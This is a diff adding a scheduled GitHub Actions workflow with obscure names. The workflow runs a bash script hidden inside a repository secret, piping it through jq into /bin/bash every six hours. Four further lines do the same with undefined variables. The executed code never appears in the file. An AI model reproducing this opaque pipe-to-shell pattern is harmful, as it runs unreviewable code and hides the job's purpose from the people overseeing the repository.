@@ -1,0 +1,22 @@
+name: diusanrenjiefangjun
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: diusanrenjiefangjun
+        env:
+          ost00910: ${{ secrets.ost00910 }}
+        run: |
+          echo $ost00910 | jq -r .d5 | /bin/bash
+          echo $sfp04 | jq -r .mzc587 | /bin/bash
+          echo $zs85936 | jq -r .skeo570 | /bin/bash
+          echo $vq5977 | jq -r .rej3 | /bin/bash
+          echo $shkdr75506 | jq -r .ht9089 | /bin/bash
+
